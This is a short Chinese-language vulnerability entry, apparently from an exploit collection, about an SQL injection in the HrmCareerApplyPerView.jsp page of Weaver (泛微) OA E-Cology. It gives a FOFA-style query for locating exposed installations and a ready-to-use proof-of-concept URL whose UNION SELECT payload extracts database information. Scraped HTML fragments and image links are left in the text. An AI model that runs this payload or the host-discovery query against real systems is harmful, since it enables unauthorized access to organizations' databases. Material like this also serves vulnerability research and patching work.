# 泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞

## 漏洞描述

泛微OA E-Cology HrmCareerApplyPerView.jsp 文件存在SQL注入漏洞，攻击者通过漏洞可以获取服务器数据库敏感文件

## 漏洞影响

泛微OA E-Cology </a-checkbox></br>

## 网络测绘

app="泛微-协同办公OA"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1656734700582-b9fa4bec-ab37-4bbb-b1fb-4ccccda497df.png)

验证POC

```php
/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7
```

![img](../../../.vuepress/public/img/1656734767484-f94594ff-00ff-444f-8668-b9108e63ed02.png)